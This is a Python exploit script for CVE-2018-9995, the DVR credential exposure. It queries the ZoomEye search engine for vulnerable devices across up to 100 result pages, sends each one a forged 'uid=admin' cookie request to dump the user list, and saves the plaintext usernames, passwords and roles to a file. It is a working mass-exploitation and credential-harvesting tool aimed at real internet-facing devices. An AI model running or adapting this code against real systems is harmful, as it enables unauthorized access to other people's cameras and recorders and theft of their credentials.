# -*- coding: utf-8 -*-
from __future__ import print_function
import json
import requests
import argparse
import tableprint as tp
import os
import urllib
import urllib2
import httplib
import socket

class Colors:
    BLUE        = '\033[94m'
    GREEN       = '\033[32m'
    RED         = '\033[0;31m'
    DEFAULT     = '\033[0m'
    ORANGE      = '\033[33m'
    WHITE       = '\033[97m'
    BOLD        = '\033[1m'
    BR_COLOUR   = '\033[1;37;40m'

banner = '''
                             __..--.._
      .....              .--~  .....  `.
    .":    "`-..  .    .' ..-'"    :". `
    ` `._ ` _.'`"(     `-"'`._ ' _.' '
         ~~~      `.          ~~~
                  .'
                 /
                (
                 ^---'


 [*] @capitan_alfa
'''

details = ''' 
 # Exploit Title:   DVRs; Credentials Exposed
 # Date:            09/04/2018
 # Exploit Author:  Fernandez Ezequiel ( @capitan_alfa )
 # version: 1.2
'''

'''
parser = argparse.ArgumentParser(prog='getDVR_Credentials.py',
                                description=' [+] Obtaining Exposed credentials', 
                                epilog='[+] Demo: python getDVR_Credentials.py --host 192.168.1.101 -p 81')

parser.add_argument('--host',   dest="HOST",    help='Host',    required=True)
parser.add_argument('--port',   dest="PORT",    help='Port',    default=80)
'''

'''
args    =   parser.parse_args()


HST     =   args.HOST
port    =   args.PORT

'''

x = open("CVE-2018-9995.txt",'w')
x.write(' ')
x.close()

accurl = "https://api.zoomeye.org/user/login"
accdata = {"username":"zoomeye的帐号","password":"zoomeye的密码"}
res = requests.post(accurl,json.dumps(accdata))

rs = json.loads(res.text)
token = rs['access_token']

ipls = ''

for j in range(100):
  k = j+1
  redurl = "https://api.zoomeye.org/host/search?query=Login.rsp&page="+str(k) #+country%3AIndia
  headers = {"Authorization":"JWT "+token}
  res = requests.get(redurl,headers=headers)
  rs = json.loads(res.text)
  for i in rs['matches']:
    HST = i['ip']
    port = str(i['portinfo']['port'])

    headers = {}

    fullHost_1 = "http://" + HST + ":" + str(port) + "/device.rsp?opt=user&cmd=list"
    host = "http://" + HST + ":" + str(port) + "/"

    print(Colors.GREEN + banner + Colors.DEFAULT)


    def makeReqHeaders(xCookie):
        headers["Host"] = host
        headers["User-Agent"] = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
        headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        headers["Accept-Languag"] = "es-AR,en-US;q=0.7,en;q=0.3"
        headers["Connection"] = "close"
        headers["Content-Type"] = "text/html"
        headers["Cookie"] = "uid=" + xCookie

        return headers


    try:
        rX = requests.get(fullHost_1, headers=makeReqHeaders(xCookie="admin"), timeout=10.000)
    except Exception as e:
        # print(e)
        print(Colors.RED + " [+] Timed out\n" + Colors.DEFAULT)
        #exit()

    badJson = rX.text
    try:
        dataJson = json.loads(badJson)
        totUsr = len(dataJson["list"])
    except Exception as e:
        print(" [+] Error: " + str(e))
        print(" [>] json: " + str(rX))
        #exit()

    print(Colors.GREEN + "\n [+] DVR (url):\t\t" + Colors.ORANGE + str(host) + Colors.GREEN)
    print(" [+] Port: \t\t" + Colors.ORANGE + str(port) + Colors.DEFAULT)

    print(Colors.GREEN + "\n [+] Users List:\t" + Colors.ORANGE + str(totUsr) + Colors.DEFAULT)
    print(" ")

    final_data = []

    try:
        for obj in range(0, totUsr):
            temp = []

            _usuario = dataJson["list"][obj]["uid"]
            _password = dataJson["list"][obj]["pwd"]
            _role = dataJson["list"][obj]["role"]

            temp.append(_usuario)
            temp.append(_password)
            temp.append(_role)

            final_data.append(temp)

            hdUsr = Colors.GREEN + "Username" + Colors.DEFAULT
            hdPass = Colors.GREEN + "Password" + Colors.DEFAULT
            hdRole = Colors.GREEN + "Role ID" + Colors.DEFAULT

            cabeceras = [hdUsr, hdPass, hdRole]

        tp.table(final_data, cabeceras, width=20)

    except Exception as e:
        print(" [!]: " + str(e))
        print(" [+] " + str(dataJson))

    print(" ")

    thanks = '''
    [*] https://github.com/cclauss --> Accepted suggestion: compatibility with python 3 
    '''

    ipls = ipls + i['ip']+':'+str(i['portinfo']['port'])+"\t"+str(_usuario)+"\t"+str(_password)+"\t"+str(_role)+"\n"
    print(i['ip'] +':'+ str(i['portinfo']['port'])+"\t"+str(_usuario)+"\t"+str(_password)+"\t"+str(_role))

'''
x = open("CVE-2018-9995.txt",'a')
x.write(ipls)
x.close()

'''

#quit()




x = open("CVE-2018-9995.txt",'a')
x.write(ipls)
x.close()
